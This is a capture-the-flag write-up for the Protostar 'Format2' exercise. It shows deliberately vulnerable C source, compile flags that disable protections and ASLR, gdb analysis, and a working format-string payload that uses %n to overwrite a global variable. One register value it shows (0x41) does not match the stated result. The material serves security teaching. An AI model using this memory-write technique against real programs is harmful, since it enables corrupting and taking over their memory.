## Protostar-Format2 Solution

### 1. Introduction

This is a poc solution for the "Format2" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419023621/https://exploit-exercises.com/protostar/format2/](https://web.archive.org/web/20170419023621/https://exploit-exercises.com/protostar/format2/) 
 
**Hints:**
* This level moves on from format1 and shows how specific values can be written in memory.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_2 format_2.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

Similar to the previous one, we just need to write a custom value onto the target value address.

```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x218
   0x080484a6 <+9>:	mov    eax,ds:0x804a028
   0x080484ab <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484af <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484b7 <+26>:	lea    eax,[ebp-0x208]
   0x080484bd <+32>:	mov    DWORD PTR [esp],eax
   0x080484c0 <+35>:	call   0x8048360 <fgets@plt>
   0x080484c5 <+40>:	lea    eax,[ebp-0x208]
   0x080484cb <+46>:	mov    DWORD PTR [esp],eax
   0x080484ce <+49>:	call   0x8048350 <printf@plt>
   0x080484d3 <+54>:	mov    eax,ds:0x804a030
   0x080484d8 <+59>:	cmp    eax,0x40
   0x080484db <+62>:	jne    0x80484eb <vuln+78>
   0x080484dd <+64>:	mov    DWORD PTR [esp],0x80485a0
   0x080484e4 <+71>:	call   0x8048370 <puts@plt>
   0x080484e9 <+76>:	jmp    0x8048500 <vuln+99>
   0x080484eb <+78>:	mov    eax,ds:0x804a030
   0x080484f0 <+83>:	mov    DWORD PTR [esp+0x4],eax
   0x080484f4 <+87>:	mov    DWORD PTR [esp],0x80485c0
   0x080484fb <+94>:	call   0x8048350 <printf@plt>
   0x08048500 <+99>:	leave  
   0x08048501 <+100>:	ret    
End of assembler dump.
```

```
$ objdump -t format_2 | grep target
0804a030 g     O .bss	00000004              target
```

So, target is on **0804a030**. We need to overwrite this variable with 64 since the following one compares if value is 0x40 or not.

```nasm
gdb-peda$ disas vuln
...TRIM...
0x080484d3 <+54>:	mov    eax,ds:0x804a030
0x080484d8 <+59>:	cmp    eax,0x40
...TRIM...

gdb-peda$ x/wx 0x804a030
0x804a030 <target>:

gdb-peda$ x/wx &target
0x804a030 <target>:	

gdb-peda$ p/x 64 
$1 = 0x40
```

#### 2.2 Quick Solution

So our payload will start with the address of target value in little-endian format, then we need to pop stack for 60 bytes as well (4+60 = 64).
Then we need to use %n to write on the address.

```nasm
gdb-peda$ b * 0x080484d3
gdb-peda$ r <<< $(python -c 'print "\x30\xa0\x04\x08%60x%4$n"')

gdb-peda$ disas
...TRIM...
=> 0x080484d3 <+54>:	mov    eax,ds:0x804a030
...TRIM...

gdb-peda$ i r eax
eax            0x41	0x41

gdb-peda$ c
Continuing.
you have modified the target :)
[Inferior 1 (process 3681) exited with code 040]
Warning: not running
```

#### 2.3 Final PoC

```
$ echo -ne $(python -c 'print "\x30\xa0\x04\x08%60x%4$n"') | ./format_2
0�                                                         200you have modified the target :)
```
